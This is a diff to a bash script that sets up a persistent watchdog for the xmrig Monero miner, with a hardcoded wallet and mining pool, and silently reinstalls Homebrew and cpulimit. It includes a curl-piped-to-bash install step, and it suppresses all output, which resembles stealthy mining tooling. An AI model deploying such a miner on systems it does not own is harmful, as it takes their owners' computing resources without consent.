@@ -12,7 +12,6 @@ WATCHDOG="$HOME/xmrig_watchdog.sh"
 # install Homebrew if not present
 if ! command -v brew >/dev/null 2>&1; then
   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null >/dev/null 2>&1
-  eval "$(/opt/homebrew/bin/brew shellenv)" >/dev/null 2>&1
 fi
 
 # ensure log directory exists
@@ -22,6 +21,9 @@ mkdir -p "$LOGDIR"
 cat > "$WATCHDOG" <<'EOF'
 #!/usr/bin/env bash
 set -euo pipefail
+
+# Ensure Homebrew path is available
+export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"
 
 WALLET="464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF"
 POOL="pool.moneroocean.stream:10001"
@@ -40,6 +42,11 @@ while true; do
         [ -n "$FORMULA" ] && brew install "$FORMULA" >/dev/null 2>&1 || true
       }
     fi
+  fi
+
+  # reinstall cpulimit if missing
+  if ! command -v cpulimit >/dev/null 2>&1; then
+    brew install cpulimit >/dev/null 2>&1 || true
   fi
 
   # delete log if too large (>50MB)
